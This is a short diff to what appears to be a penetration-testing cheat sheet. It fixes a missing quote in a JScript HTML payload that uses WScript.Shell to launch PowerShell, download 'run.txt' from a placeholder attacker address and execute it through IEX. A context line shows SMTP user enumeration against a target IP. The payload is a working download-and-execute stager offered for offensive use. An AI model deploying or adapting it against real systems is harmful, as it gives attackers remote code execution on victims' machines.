@@ -23,7 +23,7 @@ $ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
 <head>
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
-var r = shell.Run("powershell.exe (New-Object System.Net.WebClient).DownloadString('http://<ip>/run.txt')| IEX);
+var r = shell.Run("powershell.exe (New-Object System.Net.WebClient).DownloadString('http://<ip>/run.txt')| IEX");
 </script>
 </head>
 <body>
